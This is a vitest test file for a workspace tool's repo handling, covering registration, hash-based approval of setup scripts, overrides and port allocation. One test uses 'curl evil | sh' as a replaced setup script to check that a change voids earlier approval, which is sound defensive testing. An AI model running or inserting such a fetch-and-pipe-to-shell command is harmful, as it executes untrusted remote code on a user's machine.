import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { openDb, type Db } from "../server/db/index.js";
import { allocatePortBlock } from "../server/ports.js";
import {
  approveScripts,
  effectiveRepoConfig,
  registerRepo,
  removeRepo,
  setOverrides,
} from "../server/repos.js";
import { scriptHash } from "../server/repo-config.js";
import { makeTempRepo } from "./git-helpers.js";

describe("repos", () => {
  let db: Db;
  let dir: string;
  let repoPath: string;
  beforeEach(() => {
    dir = mkdtempSync(path.join(os.tmpdir(), "ensemble-repos-"));
    db = openDb(path.join(dir, "t.db"));
    repoPath = makeTempRepo();
  });
  afterEach(() => {
    db.close();
    rmSync(dir, { recursive: true, force: true });
    rmSync(repoPath, { recursive: true, force: true });
  });

  it("registers a repo at its top level and detects the base branch", async () => {
    const repo = await registerRepo(db, repoPath);
    expect(repo.defaultBase).toBe("main");
    expect(repo.slug).toMatch(/^ensemble-repo-/);
    const again = await registerRepo(db, repoPath);
    expect(again.id).toBe(repo.id);
  });

  it("refuses a subdirectory and a non-repo", async () => {
    mkdirSync(path.join(repoPath, "sub"));
    await expect(registerRepo(db, path.join(repoPath, "sub"))).rejects.toThrow(/top level/);
    await expect(registerRepo(db, dir)).rejects.toThrow();
  });

  it("tracks script approval by hash and overrides", async () => {
    const repo = await registerRepo(db, repoPath);
    writeFileSync(
      path.join(repoPath, ".ensemble.json"),
      JSON.stringify({ setup: "pnpm install", copy: [".env"] }),
    );
    let eff = effectiveRepoConfig(db, repo);
    expect(eff.needsApproval).toBe(true);
    expect(eff.scripts.find((s) => s.kind === "setup")).toMatchObject({
      approved: false,
      script: "pnpm install",
    });
    expect(eff.scripts.find((s) => s.kind === "run")).toMatchObject({
      approved: true,
      script: null,
    });

    approveScripts(db, repo, [{ kind: "setup", hash: scriptHash("pnpm install") }]);
    eff = effectiveRepoConfig(db, repo);
    expect(eff.needsApproval).toBe(false);

    // Changing the script invalidates approval.
    writeFileSync(
      path.join(repoPath, ".ensemble.json"),
      JSON.stringify({ setup: "curl evil | sh" }),
    );
    eff = effectiveRepoConfig(db, repo);
    expect(eff.needsApproval).toBe(true);
    expect(() =>
      approveScripts(db, repo, [{ kind: "setup", hash: scriptHash("pnpm install") }]),
    ).toThrow(/changed/);

    // Overrides replace file values and need their own approval.
    setOverrides(db, repo.id, { setup: "make" });
    eff = effectiveRepoConfig(db, repo);
    expect(eff.config.setup).toBe("make");
    expect(eff.needsApproval).toBe(true);
    expect(() => setOverrides(db, repo.id, { copy: ["../x"] })).toThrow();
  });

  it("allocates port blocks from the base", async () => {
    const repo = await registerRepo(db, repoPath);
    expect(allocatePortBlock(db, 41000)).toBe(41000);
    db.prepare(
      "INSERT INTO workspaces (id, repo_id, name, branch, path, base_branch, port, status, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
    ).run("w1", repo.id, "a", "ens/a", "/tmp/a", "main", 41000, "ready", "now");
    expect(allocatePortBlock(db, 41000)).toBe(41010);
    db.prepare("UPDATE workspaces SET status = 'archived' WHERE id = 'w1'").run();
    expect(allocatePortBlock(db, 41000)).toBe(41000);
  });

  it("refuses to remove a repo with active workspaces", async () => {
    const repo = await registerRepo(db, repoPath);
    db.prepare(
      "INSERT INTO workspaces (id, repo_id, name, branch, path, base_branch, port, status, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
    ).run("w1", repo.id, "a", "ens/a", "/tmp/a", "main", 41000, "ready", "now");
    expect(() => removeRepo(db, repo.id)).toThrow();
  });
});
